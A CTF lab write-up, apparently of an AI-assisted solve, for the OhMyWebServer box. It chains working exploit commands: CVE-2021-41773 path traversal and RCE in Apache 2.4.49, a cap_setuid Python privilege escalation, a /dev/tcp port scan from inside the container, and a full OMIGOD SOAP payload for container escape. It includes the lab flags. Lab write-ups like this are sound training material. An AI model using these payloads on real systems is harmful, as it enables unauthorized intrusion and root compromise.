# OhMyWebServer CTF Writeup
*(solved by gemini 🤖🤖🤖)*
## 1. Initial Reconnaissance
We started by scanning the target IP address to identify open ports and services using `nmap`.

```bash
nmap -sC -sV -p- -T4 --min-rate 5000 10.49.167.124
```

**Results:**
- **Port 22/tcp:** OpenSSH 8.2p1 Ubuntu
- **Port 80/tcp:** Apache httpd 2.4.49

## 2. Initial Access (CVE-2021-41773)
The web server was running **Apache 2.4.49**, which is notoriously vulnerable to **CVE-2021-41773**, a path traversal vulnerability that can lead to Remote Code Execution (RCE) if `mod_cgi` is enabled.

We tested for path traversal:
```bash
curl -s --path-as-is 'http://10.49.167.124/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```
This returned a 500 Internal Server Error, indicating the path was reached but didn't execute as a script.

We then tested for RCE by attempting to execute `/bin/sh`:
```bash
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" "http://10.49.167.124/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```
**Output:** `uid=1(daemon) gid=1(daemon) groups=1(daemon)`

We successfully gained RCE on the container as the `daemon` user.

## 3. Container Privilege Escalation
Once inside the container, we performed basic enumeration. We checked for SUID binaries and capabilities:

```bash
# Executed via the CVE-2021-41773 RCE
getcap -r / 2>/dev/null
```
**Output:** `/usr/bin/python3.7 = cap_setuid+ep`

The `python3.7` binary had the `cap_setuid` capability, which allows it to change its UID. We exploited this to become root within the container:

```bash
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("cat /root/user.txt")'
```
**User Flag:** `THM{eacffefe1d2aafcc15e70dc2f07f7ac1}`

## 4. Escaping the Container (Host Discovery)
Looking at the IP configuration (`ip a`), we saw the container IP was `172.17.0.2`, making the Docker host likely `172.17.0.1`. We used bash's built-in `/dev/tcp` to port scan the Docker host from within the container:

```bash
bash -c 'for p in 22 80 443 8080 8000 8443 3306 6379 2375 2376 5000 6443 5985 5986 9000 5984 49153 10000 9090; do timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/$p" 2>/dev/null && echo "Port $p is open"; done'
```

**Results:**
- Port 22 is open
- Port 80 is open
- Port 5986 is open

## 5. Exploiting the Docker Host (CVE-2021-38647 OMIGOD)
Port `5986` is heavily associated with **OMI (Open Management Infrastructure)** / WinRM. OMI is known to be vulnerable to **CVE-2021-38647 (OMIGOD)**, an unauthenticated RCE vulnerability. 

The vulnerability allows remote execution by sending an unauthenticated SOAP request to `/wsman` because the service fails to validate the authorization header if it is simply omitted.

To exploit this, we crafted an XML SOAP payload targeting the `root/scx` namespace to execute commands via the `SCX_OperatingSystem` class.

**OMIGOD Payload (`omi_payload_root.xml`):**
```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
   <s:Header>
      <a:To>HTTP://172.17.0.1:5986/wsman/</a:To>
      <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
      <a:ReplyTo>
         <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
      </a:ReplyTo>
      <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
      <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
      <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
      <w:OperationTimeout>PT1M30S</w:OperationTimeout>
      <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
      <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
      <w:OptionSet s:mustUnderstand="true" />
      <w:SelectorSet>
         <w:Selector Name="__cimnamespace">root/scx</w:Selector>
      </w:SelectorSet>
   </s:Header>
   <s:Body>
      <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
         <p:command>cat /root/root.txt</p:command>
         <p:timeout>0</p:timeout>
      </p:ExecuteShellCommand_INPUT>
   </s:Body>
</s:Envelope>
```
*(Note: Initially, missing the `<w:SelectorSet>` specifying `root/scx` resulted in a "The target namespace does not exist" error. Once added, the exploit succeeded).*

We base64 encoded this payload on our machine, then sent a command via our Apache RCE to decode and fire it at the Docker host:

```bash
# Executed via CVE-2021-41773 on the container
echo [BASE64_XML_PAYLOAD] | base64 -d > /tmp/omi.xml && curl -s -k -H 'Content-Type: application/soap+xml;charset=UTF-8' -d @/tmp/omi.xml https://172.17.0.1:5986/wsman
```

**Output from the host:**
```xml
...
<p:StdOut>THM{7f147ef1f36da9ae29529890a1b6011f}&#10;</p:StdOut>
...
```

**Root Flag:** `THM{7f147ef1f36da9ae29529890a1b6011f}`

## Conclusion
- **Initial Access:** CVE-2021-41773 in Apache 2.4.49.
- **Container Privesc:** Capabilities misconfiguration (`cap_setuid` on Python 3).
- **Host Privesc / Container Escape:** Internal port scanning revealed OMI on port 5986, successfully exploited via CVE-2021-38647 (OMIGOD).
